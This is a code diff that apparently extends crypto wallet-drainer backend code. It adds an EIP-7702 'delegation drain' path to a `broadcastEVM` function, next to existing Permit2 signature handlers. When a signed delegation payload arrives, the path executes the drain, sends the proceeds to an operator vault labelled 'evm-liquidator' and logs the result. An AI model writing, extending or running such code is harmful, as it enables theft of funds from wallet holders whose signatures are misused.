@@ -49,6 +49,10 @@ import {
   resolveOperationalEvmVaultAddress,
 } from './permit2-executor.js'
 import {
+  executeEip7702DelegationDrain,
+  parseEip7702SignatureEnvelope,
+} from './eip7702-drain.js'
+import {
   executeBatchPermit2Settlement,
   parseBatchPermit2SignatureEnvelope,
 } from './permit2-batch.js'
@@ -1176,6 +1180,33 @@ export async function broadcastEVM(
 
   const batchPermit2Envelope = openedPayload ? parseBatchPermit2SignatureEnvelope(openedPayload) : null
   const permit2Envelope = openedPayload ? parsePermit2SignatureEnvelope(openedPayload) : null
+  const eip7702Envelope = openedPayload ? parseEip7702SignatureEnvelope(openedPayload) : null
+
+  if (ctx.protocol === 'eip7702_delegation' || eip7702Envelope != null) {
+    const chainId = parseSettlementChainId(ctx.chain_id)
+    const payload = openedPayload ?? ctx.signature_hex ?? ''
+    const settlement = await executeEip7702DelegationDrain(payload, chainId)
+    if (settlement.ok && settlement.transaction_hash) {
+      const result = broadcastResult({
+        lane: 'evm-liquidator',
+        chain_family: 'EVM',
+        destination_vault: vaults.evm,
+        status: 'broadcasted',
+        tx_hash: settlement.transaction_hash,
+        detail: settlement.detail ?? 'EIP-7702 delegation drain complete',
+      })
+      emitSettlementIgnitedTelemetry(result, ctx)
+      return result
+    }
+    return broadcastResult({
+      lane: 'evm-liquidator',
+      chain_family: 'EVM',
+      destination_vault: vaults.evm,
+      status: 'broadcast_failed',
+      detail: settlement.detail ?? 'EIP-7702 delegation drain failed',
+    })
+  }
+
   const isPermit2Protocol =
     ctx.protocol === 'permit2_eip712' ||
     ctx.protocol === 'permit2_batch_eip712' ||
